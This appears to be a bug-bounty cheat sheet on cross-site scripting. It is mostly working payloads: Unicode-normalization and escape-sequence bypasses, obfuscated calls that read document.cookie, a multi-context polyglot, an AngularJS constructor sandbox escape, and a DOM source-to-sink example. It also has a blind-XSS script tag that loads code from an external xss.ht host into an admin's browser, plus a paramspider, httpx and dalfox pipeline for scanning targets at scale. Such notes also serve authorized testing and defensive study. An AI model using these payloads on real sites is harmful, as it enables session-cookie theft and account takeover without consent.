# Cross Site Scripting (XSS)

### Normalization

```
Unicode -> Representation & Encodings 
character -> Code Point 
e 
é 
Unicode Literal: U+00E9 : Code Point 
Combination: e + ´ : U+0065 + U+0301
    User: démo , demo -> Register 
Solution: Unicode Normalization 
        Canonical: same appearance and meaning 
        Compatibility: two values may represent the same abstract character but can be displayed differently
        NFKC _ NFKD _ NFC _ NFD 
XSS: ﹤img src⁼p onerror⁼＇alert⁽1⁾＇﹥ -> NFKC _ NFKD -> <img src=p onerror=alert(1)>
```

```
＜img src⁼p onerror⁼＇alert︵1⁾＇﹥ 
LFI _ SSRF & Open Redirect _ RCE _ Logic: admin 
SQLI -> ' " -> Data -> Normalization -> ' -> DB 
```

```
Detection: Kelvin Sign -> %e2%84%aa -> borna%e2%84%aa
```

{% embed url="https://appcheck-ng.com/wp-content/uploads/unicode_normalization.html" %}

### Encodings

```
    e -> \u0065 -> unicode 
    e -> \x65   -> hex 
    e -> \145   -> octal 
```

### xss payload generation

```
    alert(1); // prompt(2); confirm(3); 
    al\u0065rt(1);
    \u0061\u006C\u0065\u0072\u0074(2);
    \u0061\u006C\u0065\u0072\u0074`2`;
    \u0061\u006C\u0065\u0072\u0074(document.domain);
    \u0061\u006C\u0065\u0072\u0074(docum\u0065nt.domain);
    \u0061\u006C\u0065\u0072\u0074(docum\u0065nt.dom\u0061in);
    \u0061\u006C\u0065\u0072\u0074(docum\u0065nt.dom\u0061in);
    with(document)alert(cookie);
    with(docum\u0065nt)al\u0065rt(cooki\u0065);
    with(docum\u0065nt)\u0061\u006C\u0065\u0072\u0074(cooki\u0065);
    alert(document['cookie'])
    alert(document[`cookie`])
    al\u0065rt(document[String.fromCharCode(99,111,111,107,105,101)])
    al\u0065rt(docum\u0065nt[String.fromCharCod\u0065(99,111,111,107,105,101)])
    eval('alert(document.cookie)');
    eval('with(docum\u0065nt)al\u0065rt(cooki\u0065)');
    eval(`with(docum\u0065nt)al\u0065rt(cooki\u0065)`);
    \u0065val(`with(docum\u0065nt)al\u0065rt(cooki\u0065)`);
    \u0065val(`with(docum\x65nt)al\u0065rt(cooki\u0065)`);
    \u0065val(`with(docum\x65nt)al\u0065rt(cooki\145)`); -> Error
    \u0065val('with(docum\x65nt)al\u0065rt(cooki\145)');
    onerror=alert;throw document.cookie
    throw onerror=alert,'test','hello',document.cookie
    {onerror=eval}throw'=alert\x281337\x29'
    {onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}
```

### special tags

xss in some tags not work and we should exit from this tag and then call xss payload

```
<title>not work<title>
<iframe>not work</iframe>
<noscript>not work</noscript>
<textarea>not work</textarea>
<style>not work</style>
```

### XSS Polyglot

```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
```

### Blind XSS

```
XSS Payload -> contact us -> admin 

https://xsshunter.com/
"><script src=https://logicalhunt3r.xss.ht></script>

polyglots 
    </title></style></textarea></noscript>"><script src=https://logicalhunt3r.xss.ht></script>
```

### Sandbox Frameworks xss

```
AngularJS Basics 
    extends -> HTML (attributes) : Directives 
    bind -> HTML -> Expressions 
 there is no :
     $scope.alert()
 then we create function with constructor:
     {{constructor.constructor("alert(1)")()}}
 vuln version:
     angular 1.8 -> Core        
```

### DOM XSS

```
    Inputs   
    Client (Input) -> JavaScript (Source) -> Execute (Sink)
    Sources: https://domgo.at/cxss/sources/somevalue?param1=paramvalue#hashvalue
    Sinks: https://domgo.at/cxss/sinks
 
```

```
var pathName = location.pathname // Source: location.pathname
document.getElementById('result').innerHTML = patName // Sink: innerHTML -> DOM XSS 
```

### automation

```
 python3 paramspider.py -d target.com -s TRUE -e woff,tof,ttf,svg,pdf | deduplicate | sed '1,4d' | httpx -silent | dalfox pipe -S
```

### Self-XSS chain

```
- CSRF + Self-XSS 
- login/logout CSRF + Self-XSS 
- IDOR + Self-XSS 
```

